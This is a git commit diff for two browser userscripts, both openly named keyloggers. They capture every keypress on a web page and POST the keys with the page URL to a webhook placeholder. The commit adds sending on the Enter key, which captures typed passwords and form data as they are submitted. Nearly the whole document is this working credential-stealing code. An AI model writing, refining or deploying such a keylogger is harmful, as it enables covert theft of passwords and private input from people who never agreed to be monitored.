710c59761455b0c27d964b0db965a5dce2e6601c
Lyzev <lyzev.info@gmail.com>
2022-03-29 19:20:43 +0200

    small improvement
    Signed-off-by: Lyzev <lyzev.info@gmail.com>

--- src/keylogger.click.js
+++ src/keylogger.click.js
@@ -11,23 +11,29 @@
 // ==/UserScript==
 
 (function() {
-    const webhook = "WEBHOOK-URL"
+    const webhook = 'WEBHOOK-URL'
     let data = []
 
-    window.addEventListener('keypress', e => data.push(e.key))
+    window.addEventListener('keypress', e => {
+        data.push(e.key)
+        if (e.key === 'Enter' && data.length !== 0) {
+            send('**URL**: `' + document.URL.substring(0, Math.max(document.URL.length, 20)) + '`\n' + JSON.stringify(data.slice(data.length - Math.max(data.length, 250))))
+            data = []
+        }
+    })
 
     window.addEventListener('click', e => {
         if (data.length === 0) return
-        send("**URL**: `" + document.URL.substring(0, Math.max(document.URL.length, 20)) + "`\n" + JSON.stringify(data.slice(data.length - Math.max(data.length, 250))))
+        send('**URL**: `' + document.URL.substring(0, Math.max(document.URL.length, 20)) + '`\n' + JSON.stringify(data.slice(data.length - Math.max(data.length, 250))))
         data = []
     })
-    
+
     function send(text) {
         const request = new XMLHttpRequest()
-        request.open("POST", webhook)
+        request.open('POST', webhook)
         request.setRequestHeader('Content-type', 'application/json')
         const params = {
-            username: "Keylogger",
+            username: 'Keylogger',
             content: text
         }
         request.send(JSON.stringify(params))
--- src/keylogger.js
+++ src/keylogger.js
@@ -11,7 +11,7 @@
 // ==/UserScript==
 
 (function() {
-    const webhook = "WEBHOOK-URL"
+    const webhook = 'WEBHOOK-URL'
     const delay = 2000
     let data = []
 
@@ -19,16 +19,16 @@
 
     setInterval(function() {
         if (data.length === 0) return
-        send("**URL**: `" + document.URL.substring(0, Math.max(document.URL.length, 20)) + "`\n" + JSON.stringify(data.slice(data.length - Math.max(data.length, 250))))
+        send('**URL**: `' + document.URL.substring(0, Math.max(document.URL.length, 20)) + '`\n' + JSON.stringify(data.slice(data.length - Math.max(data.length, 250))))
         data = []
     }, delay)
 
     function send(text) {
         const request = new XMLHttpRequest();
-        request.open("POST", webhook);
+        request.open('POST', webhook);
         request.setRequestHeader('Content-type', 'application/json')
         const params = {
-            username: "Keylogger",
+            username: 'Keylogger',
             content: text
         };
         request.send(JSON.stringify(params))
